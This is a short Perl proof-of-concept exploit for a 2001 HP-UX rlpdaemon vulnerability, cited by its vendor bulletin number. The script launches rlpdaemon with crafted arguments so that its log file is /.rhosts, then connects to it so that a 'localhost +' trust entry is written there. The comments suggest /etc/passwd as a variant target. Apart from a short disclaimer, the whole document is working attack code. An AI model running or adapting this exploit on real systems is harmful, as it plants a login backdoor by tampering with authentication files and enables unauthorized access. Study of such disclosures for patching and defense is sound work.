#!/opt/perl5/bin/perl -w

# HP-UX rlpdaemon local exploit
# Bulletin HPSBUX0111-176  (November 2001)
#
# For use only on machines where you have legitimate root.
# This attempts to add junk (including "localhost +") to /.rhosts.
# Obvious variants could include /etc/passwd.

use IO::Socket;

$PORT = 9000;   # pick something not in use

$pid=fork;
die("fork: $!") unless (defined($pid));

if (0 == $pid) {
    # child - server, exec rlpdaemon with chosen argv

    $IPPROTO_TCP=6;
    $SOCK_STREAM=1;
    $AF_INET=2;
    $PF_INET=2;

    $sockaddr='S n a4 x8';  # packed socket data

    $this=pack($sockaddr, $AF_INET, $PORT, "\0\0\0\0") or die("pack: $!");
    socket(S, $PF_INET, $SOCK_STREAM, $IPPROTO_TCP) || die ("socket: $!");
    bind(S, $this) or die("bind: $!");
    listen(S, 5) or die("listen: $!");
    $addr=accept(NS, S);

    # dup2 on 3 standard streams
    open(STDIN, "+<&NS") or die("dup2: $!");
    open(STDOUT, "+>&NS") or die("dup2: $!");
    open(STDERR, "+>&NS") or die("dup2: $!");

    exec {"/usr/sbin/rlpdaemon"}
          "\nlocalhost +\n",
    "-i", "-l", "-L", "/.rhosts";
    # UNREACHED
    exit(1);
}

sleep 5;   # let server start before we connect to it

# parent - connect to server with loggable action
$remote = IO::Socket::INET->new(
    Proto    => "tcp",
    PeerAddr => "localhost",
    PeerPort => $PORT
)
or die "cannot connect to port $PORT at localhost";

# RFC1179
printf($remote "%clp\n", 2);  # rlpdaemon should log this
close($remote);
exit(0);